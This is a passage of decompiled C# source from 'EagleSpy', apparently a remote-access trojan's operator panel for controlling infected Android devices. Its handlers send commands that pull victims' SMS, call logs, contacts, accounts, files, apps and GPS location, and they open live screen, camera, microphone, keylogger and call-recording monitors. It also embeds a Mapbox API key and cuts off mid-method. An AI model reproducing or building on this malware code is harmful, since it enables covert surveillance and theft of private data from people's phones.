	// Token: 0x060003F5 RID: 1013 RVA: 0x0005B088 File Offset: 0x00059288
	private void Locationbtn_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient3,
										Data.SPL_SOCKET,
										Data.SPL_DATA,
										Data.SPL_SOCKET,
										SecurityKey.getGPS
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060003F6 RID: 1014 RVA: 0x0005B1CC File Offset: 0x000593CC
	private void Searchbtn_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.ClientsWindow.Rows.Count < 1)
			{
				EagleAlert.Showinformation("No Clients Found");
			}
			else if (string.IsNullOrEmpty(this.searchtext.Text))
			{
				EagleAlert.Showinformation("Enter Text First");
			}
			else
			{
				int num = this.ClientsWindow.Rows.Count - 1;
				for (int num2 = 0; num2 <= num; num2++)
				{
					try
					{
						Client client = (Client)this.ClientsWindow.Rows[num2].Cells[8].Tag;
						if (!this.searchbefore.Contains(client.Row) && (client.ClientName.ToLower().Contains(this.searchtext.Text.ToLower()) | client.ClientAddressIP.ToLower().Contains(this.searchtext.Text.ToLower()) | client.Country.ToLower().Contains(this.searchtext.Text.ToLower()) | client.android.ToLower().Contains(this.searchtext.Text.ToLower()) | client.ClientName.ToLower().Contains(this.searchtext.Text.ToLower()) | client.ActiveNow.ToLower().Contains(this.searchtext.Text.ToLower())))
						{
							this.ClientsWindow.FirstDisplayedScrollingRowIndex = client.Row.Index;
							this.searchbefore.Add(client.Row);
							break;
						}
					}
					catch (Exception)
					{
					}
				}
			}
		}
	}

	// Token: 0x060003F7 RID: 1015 RVA: 0x0005B3A8 File Offset: 0x000595A8
	private void B_ok_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			this.ClientsWindow.SelectedRows[0].Selected = false;
		}
	}

	// Token: 0x060003F8 RID: 1016 RVA: 0x0000206C File Offset: 0x0000026C
	private void TCbattertpic_MouseEnter(object sender, EventArgs e)
	{
	}

	// Token: 0x060003F9 RID: 1017 RVA: 0x0005B3E4 File Offset: 0x000595E4
	private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
	{
		try
		{
			if (this.ClientsWindow.Rows.Count > 0)
			{
				this.ClientsWindow.FirstDisplayedScrollingRowIndex = 0;
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060003FA RID: 1018 RVA: 0x0005B428 File Offset: 0x00059628
	private void Clientfoldrbtn_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				string folderUSER = ((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).FolderUSER;
				if (!Directory.Exists(folderUSER))
				{
					Directory.CreateDirectory(folderUSER);
				}
				Process.Start(folderUSER);
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060003FB RID: 1019 RVA: 0x0005B4BC File Offset: 0x000596BC
	private void DrakeUIButtonIcon11_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).Blockme(((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).ClientAddressIP);
				((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).Close(((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).myClient);
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060003FC RID: 1020 RVA: 0x0005B5B8 File Offset: 0x000597B8
	private void DrakeUIButtonIcon10_Click(object sender, EventArgs e)
	{
		try
		{
			if ((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
			{
				TcpClient myClient = ((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).myClient;
				object[] parametersObjects = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".info",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.Information,
						Data.SPL_SOCKET,
						"information"
					}),
					Codes.Encoding().GetBytes("null"),
					(Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag
				};
				((Client)this.ClientsWindow.SelectedRows[0].Cells[8].Tag).SendMessage(parametersObjects);
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060003FD RID: 1021 RVA: 0x0005B714 File Offset: 0x00059914
	private void DrakeUIButtonIcon9_Click(object sender, EventArgs e)
	{
		try
		{
			if (this.ClientsWindow.Rows.Count > 0)
			{
				this.ClientsWindow.FirstDisplayedScrollingRowIndex = this.ClientsWindow.Rows[checked(this.ClientsWindow.Rows.Count - 1)].Index;
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060003FE RID: 1022 RVA: 0x0005B780 File Offset: 0x00059980
	private void Searchtext_TextChanged(object sender, EventArgs e)
	{
		this.searchbefore.Clear();
		if (!string.IsNullOrEmpty(this.searchtext.Text))
		{
			this.clearsrchbtn.Visible = true;
		}
		else
		{
			this.clearsrchbtn.Visible = false;
		}
	}

	// Token: 0x060003FF RID: 1023 RVA: 0x000029F7 File Offset: 0x00000BF7
	private void DrakeUIButtonIcon13_Click(object sender, EventArgs e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	// Token: 0x06000400 RID: 1024 RVA: 0x00002A09 File Offset: 0x00000C09
	private void DrakeUIButtonIcon12_Click(object sender, EventArgs e)
	{
		this.smoothfadedout(this, 40);
	}

	// Token: 0x06000401 RID: 1025 RVA: 0x0005B7C8 File Offset: 0x000599C8
	[DebuggerStepThrough]
	private void smoothfadedout(Form targetform, int slowtime)
	{
		EagleSpyMain.VB_0024StateMachine_108_smoothfadedout vb_0024StateMachine_108_smoothfadedout = new EagleSpyMain.VB_0024StateMachine_108_smoothfadedout();
		vb_0024StateMachine_108_smoothfadedout._0024VB_0024Me = this;
		vb_0024StateMachine_108_smoothfadedout._0024VB_0024Local_targetform = targetform;
		vb_0024StateMachine_108_smoothfadedout._0024VB_0024Local_slowtime = slowtime;
		vb_0024StateMachine_108_smoothfadedout._0024State = -1;
		vb_0024StateMachine_108_smoothfadedout._0024Builder = AsyncVoidMethodBuilder.Create();
		vb_0024StateMachine_108_smoothfadedout._0024Builder.Start<EagleSpyMain.VB_0024StateMachine_108_smoothfadedout>(ref vb_0024StateMachine_108_smoothfadedout);
	}

	// Token: 0x06000402 RID: 1026 RVA: 0x0005B814 File Offset: 0x00059A14
	private void BlockClientToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGVblocked.Rows.Count > 0 && this.DGVblocked.SelectedRows.Count > 0)
			{
				DataGridViewRow dataGridViewRow = this.DGVblocked.SelectedRows[0];
				if (dataGridViewRow != null)
				{
					int num = this.server.Count - 1;
					for (int num2 = 0; num2 <= num; num2++)
					{
						try
						{
							if (this.server[num2].Blocklist.Contains(dataGridViewRow.Cells[1].Value.ToString()))
							{
								this.server[num2].Blocklist.Remove(dataGridViewRow.Cells[1].Value.ToString());
								Data.MainForm.DGVblocked.Rows.Remove(dataGridViewRow);
							}
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}
	}

	// Token: 0x06000403 RID: 1027 RVA: 0x0005B920 File Offset: 0x00059B20
	private void ToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DataLog.Rows.Count > 0 && this.DataLog.SelectedRows.Count > 0)
			{
				DataGridViewRow dataGridViewRow = this.DataLog.SelectedRows[0];
				if (dataGridViewRow != null)
				{
					try
					{
						int num = this.server.Count - 1;
						for (int num2 = 0; num2 <= num; num2++)
						{
							try
							{
								if (!this.server[num2].Blocklist.Contains(dataGridViewRow.Cells[1].Value.ToString().Replace(" ", "")))
								{
									this.server[num2].Blocklist.Add(dataGridViewRow.Cells[1].Value.ToString().Replace(" ", ""));
									Data.MainForm.DGVblocked.Rows.Add(new object[]
									{
										GetFlagThisIp.ThisIp(dataGridViewRow.Cells[1].Value.ToString()),
										dataGridViewRow.Cells[1].Value.ToString()
									});
								}
							}
							catch (Exception)
							{
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
		}
	}

	// Token: 0x06000404 RID: 1028 RVA: 0x00002A14 File Offset: 0x00000C14
	private void Clearsrchbtn_Click(object sender, EventArgs e)
	{
		this.searchtext.Text = "";
	}

	// Token: 0x06000405 RID: 1029 RVA: 0x0000206C File Offset: 0x0000026C
	private void Mapupdater_Tick(object sender, EventArgs e)
	{
	}

	// Token: 0x06000406 RID: 1030 RVA: 0x0000206C File Offset: 0x0000026C
	private void Mainbatteryico_MouseEnter(object sender, EventArgs e)
	{
	}

	// Token: 0x06000407 RID: 1031 RVA: 0x0005BAB4 File Offset: 0x00059CB4
	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		try
		{
			Process.Start("");
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000408 RID: 1032 RVA: 0x0000206C File Offset: 0x0000026C
	private void DrakeUIImageButton1_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x06000409 RID: 1033 RVA: 0x0000206C File Offset: 0x0000026C
	private void Battarypic_MouseEnter(object sender, EventArgs e)
	{
	}

	// Token: 0x0600040A RID: 1034 RVA: 0x0005BAE4 File Offset: 0x00059CE4
	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		try
		{
			Process.Start("https://telegram.me/eaglespy");
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x0600040B RID: 1035
	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool HideCaret(IntPtr hWnd);

	// Token: 0x0600040C RID: 1036 RVA: 0x0000206C File Offset: 0x0000026C
	private void targetCtext_GotFocus(object sender, EventArgs e)
	{
	}

	// Token: 0x0600040D RID: 1037 RVA: 0x0005BB14 File Offset: 0x00059D14
	private void FilesToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								object[] parametersObjects = new object[]
								{
									client.myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".files",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getfiles,
										Data.SPL_SOCKET,
										"files",
										Data.SPL_DATA,
										"get0"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600040E RID: 1038 RVA: 0x0005BCAC File Offset: 0x00059EAC
	private void SMSToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".sms",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getSMS,
										Data.SPL_SOCKET,
										"sms",
										Data.SPL_DATA,
										"content://sms/"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600040F RID: 1039 RVA: 0x0005BE48 File Offset: 0x0005A048
	private void CallsToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".calls",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getCalls,
										Data.SPL_SOCKET,
										"calls"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000410 RID: 1040 RVA: 0x0005BFD4 File Offset: 0x0005A1D4
	private void ContactsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".contacts",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getContacts,
										Data.SPL_SOCKET,
										"contacts"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000411 RID: 1041 RVA: 0x0005C160 File Offset: 0x0005A360
	private void AccountsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".info",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.Account,
										Data.SPL_SOCKET,
										"account"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000412 RID: 1042 RVA: 0x0005C2EC File Offset: 0x0005A4EC
	private void ApplicationsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".apps",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.Apps,
										Data.SPL_SOCKET,
										"apps"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000413 RID: 1043 RVA: 0x0005C478 File Offset: 0x0005A678
	public string formnames(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		new MD5CryptoServiceProvider();
		ASCIIEncoding asciiencoding = new ASCIIEncoding();
		byte[] bytes = asciiencoding.GetBytes(pass);
		try
		{
			rijndaelManaged.Key = bytes;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array = Convert.FromBase64String(input);
			return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
		}
		catch (Exception)
		{
		}
		return "";
	}

	// Token: 0x06000414 RID: 1044 RVA: 0x0005C4F8 File Offset: 0x0005A6F8
	private void ScreenMonitorToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Live_Screen_" + client.ClientRemoteAddress;
								ScreenShoter screenShoter = (ScreenShoter)MyProject.Application.OpenForms[name];
								if (screenShoter == null)
								{
									new ScreenShoter
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "Live Screen", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient,
										DownloadsFolder = client.FolderUSER
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000415 RID: 1045 RVA: 0x0005C680 File Offset: 0x0005A880
	private void ScreenReaderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Screen_Reader_" + client.ClientRemoteAddress;
								ScreenReader screenReader = (ScreenReader)MyProject.Application.OpenForms[name];
								if (screenReader == null)
								{
									new ScreenReader
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "Screen Reader", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										Classclient = client
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000416 RID: 1046 RVA: 0x0005A96C File Offset: 0x00058B6C
	private void CameraMonitorToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								int value = 0;
								int value2 = 0;
								if (client.Isv4)
								{
									object[] parametersObjects = new object[]
									{
										myClient,
										string.Concat(new string[]
										{
											SecurityKey.KeysClient2,
											Data.SPL_SOCKET,
											"lcm<*>",
											client.ClientRemoteAddress,
											Data.SPL_SOCKET,
											array[0],
											Data.SPL_SOCKET,
											array[1],
											Data.SPL_SOCKET,
											SecurityKey.Lockscreen,
											Data.SPL_SOCKET,
											Conversions.ToString(value),
											Data.SPL_SOCKET,
											Conversions.ToString(value2),
											Data.SPL_SOCKET,
											Data.SPL_ARRAY,
											Data.SPL_SOCKET,
											client.ClientRemoteAddress
										}),
										Codes.Encoding().GetBytes("null"),
										client
									};
									client.SendMessage(parametersObjects);
								}
								else
								{
									string name = "Camera_Manager_" + client.ClientRemoteAddress;
									CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[name];
									if (cameraManager != null)
									{
										break;
									}
									cameraManager = new CameraManager();
									cameraManager.Name = name;
									cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", client.ClientAddressIP);
									cameraManager.classClient = client;
									if (cameraManager.classClient != null)
									{
										reso.Directory_Exist(cameraManager.classClient);
										cameraManager.tmpFolderUSER = cameraManager.classClient.FolderUSER;
									}
									cameraManager.Client = client.myClient;
									cameraManager.classCamera = client;
									cameraManager.TempImage = new PictureBox();
									cameraManager.combotext.Visible = false;
									cameraManager.combosizes.Visible = false;
									cameraManager.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000417 RID: 1047 RVA: 0x0005C7C8 File Offset: 0x0005A9C8
	private void MicrophoneMonitorToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string name = "Microphone_" + client.ClientRemoteAddress;
								Microphone microphone = (Microphone)MyProject.Application.OpenForms[name];
								if (microphone == null)
								{
									string[] array = client.Keys.Split(new char[]
									{
										':'
									});
									if (array.Length < infoServer.KeySize)
									{
										break;
									}
									object[] parametersObjects = new object[]
									{
										myClient,
										string.Concat(new string[]
										{
											SecurityKey.KeysClient1,
											Data.SPL_SOCKET,
											reso.domen,
											".microphone",
											Data.SPL_SOCKET,
											"method",
											Data.SPL_SOCKET,
											SecurityKey.resultClient,
											Data.SPL_SOCKET,
											"start",
											Data.SPL_DATA,
											array[0],
											Data.SPL_DATA,
											array[1],
											Data.SPL_DATA,
											"8000",
											Data.SPL_DATA,
											SecurityKey.MicwaveOutByte,
											Data.SPL_DATA,
											client.ClientRemoteAddress,
											Data.SPL_DATA,
											"0"
										}),
										Codes.Encoding().GetBytes("null"),
										client
									};
									client.SendMessage(parametersObjects);
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000418 RID: 1048 RVA: 0x0005AEA4 File Offset: 0x000590A4
	private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							string name = "Keylogger_" + client.ClientRemoteAddress;
							Keylogger keylogger = (Keylogger)MyProject.Application.OpenForms[name];
							if (client != null && keylogger == null)
							{
								keylogger = new Keylogger();
								keylogger.Name = name;
								keylogger.Title = string.Format("{0} - IP:{1}", "Keylogger", client.ClientAddressIP);
								keylogger.Client = client.myClient;
								keylogger.classClient = client;
								keylogger.DGV0.Columns[3].Width = 48;
								keylogger.DGV0.Columns[3].DisplayIndex = 0;
								keylogger.tmpAddressIP = client.ClientAddressIP;
								keylogger.tmpClientName = client.ClientName;
								keylogger.tmpCountry = client.Country;
								keylogger.tmpFolderUSER = client.FolderUSER;
								client.Keylogg = true;
								keylogger.Show();
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000419 RID: 1049 RVA: 0x0005CA1C File Offset: 0x0005AC1C
	private void LiveModeToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient3,
										Data.SPL_SOCKET,
										Data.SPL_DATA,
										Data.SPL_SOCKET,
										SecurityKey.getGPS
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600041A RID: 1050 RVA: 0x0005CB54 File Offset: 0x0005AD54
	private void SilentModeGOIPToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string[] latLng = Data.cityclass.GetLatLng(client.ClientAddressIP);
								if (latLng != null)
								{
									string name = "Location_Manager_" + client.ClientRemoteAddress;
									LocationManager locationManager = (LocationManager)MyProject.Application.OpenForms[name];
									if (locationManager == null)
									{
										reso.Directory_Exist(client);
										locationManager = new LocationManager();
										locationManager.infoMaps = new string[]
										{
											client.FolderUSER,
											client.ClientName
										};
										locationManager.Name = name;
										locationManager.Title = string.Format("{0} - IP:{1}", "Location Manager", client.ClientAddressIP);
										locationManager.Client = client.myClient;
										locationManager.classClient = client;
										locationManager.Issilent = true;
										locationManager.tmpFolderUSER = client.FolderUSER;
										if (!Directory.Exists(locationManager.tmpFolderUSER))
										{
											Directory.CreateDirectory(locationManager.tmpFolderUSER);
										}
										locationManager.Show();
										locationManager.Zoom = 15;
									}
									locationManager.ImageSize.Width = 480;
									locationManager.ImageSize.Height = 360;
									locationManager.Markers = reso.Between("<param name=\"markers_gsm\">", "</param>");
									locationManager.Link = "https://api.mapbox.com/styles/v1/";
									locationManager.Key = "pk.eyJ1IjoiYWxmYWtyYWtlbiIsImEiOiJja3h1Z283bWMzbDNhMnlxa3VpeDdmejZjIn0.K8KkGJxQgTUJroiFHsrewA";
									string str = reso.Maps_style();
									locationManager.style = reso.Between("<param name=\"" + str + "\">", "</param>");
									locationManager.Accuracy = "jump";
									locationManager.Speed = "jump";
									locationManager.List.Add(new double[]
									{
										Conversions.ToDouble(latLng[0]),
										Conversions.ToDouble(latLng[1])
									});
									locationManager.Text = locationManager.Title;
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600041B RID: 1051 RVA: 0x0005CE10 File Offset: 0x0005B010
	private void WebBrowserToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Web_Browser_" + client.ClientAddressIP;
								WebViewMonitor webViewMonitor = (WebViewMonitor)MyProject.Application.OpenForms[name];
								if (webViewMonitor == null)
								{
									new WebViewMonitor
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "Web Browser", client.ClientAddressIP),
										Tag = client.ClientAddressIP,
										Classclient = client
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600041C RID: 1052 RVA: 0x0005CF58 File Offset: 0x0005B158
	private void CallRecorderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Calls_Records_" + client.ClientAddressIP;
								Calls_Records calls_Records = (Calls_Records)MyProject.Application.OpenForms[name];
								if (calls_Records == null)
								{
									new Calls_Records
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "Calls Records", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										ClassClient = client,
										Client = client.myClient,
										DownloadsFolder = client.FolderUSER
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600041D RID: 1053 RVA: 0x0005D0E0 File Offset: 0x0005B2E0
	private void ToolStripMenuItem3_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
